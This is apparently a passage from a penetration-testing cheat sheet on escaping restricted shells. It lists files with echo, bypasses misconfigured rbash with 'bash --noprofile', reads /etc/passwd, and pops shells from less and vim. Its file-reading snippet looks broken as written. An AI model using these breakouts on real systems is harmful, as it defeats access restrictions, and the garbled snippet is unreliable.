* Missing `ls` or `dir` commands

	If you cannot run `ls`, `dir`, `find` nor `grep` to list files you can use

	```
	echo *
	echo /any/path/*
	```


* restricted bash (`rbash`) - [GitHub Gist](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290)

	`rbash` is a shell with restriction features. Misconfigured `rbash` can be bypassed.

	```bash
    # List available commands
    compgen -c

    # Run bash without profiles (when rbash is initialized in .bashrc)
    bash --noprofile

    # Read files
	mapfile -t  < /etc/passwd
	printf "$s\n" "${anything[@]}"
	```

* shell from provided commands - [Website](https://gtfobins.github.io/)

    Some commands/binaries allows to pop a shell. Use [GTFOBins](https://gtfobins.github.io/) to find them. Here are the most common ones:

    | Command | Description |
    | --- | --- |
    | less | `!/bin/sh` |
    | vim | `:!/bin/sh` |
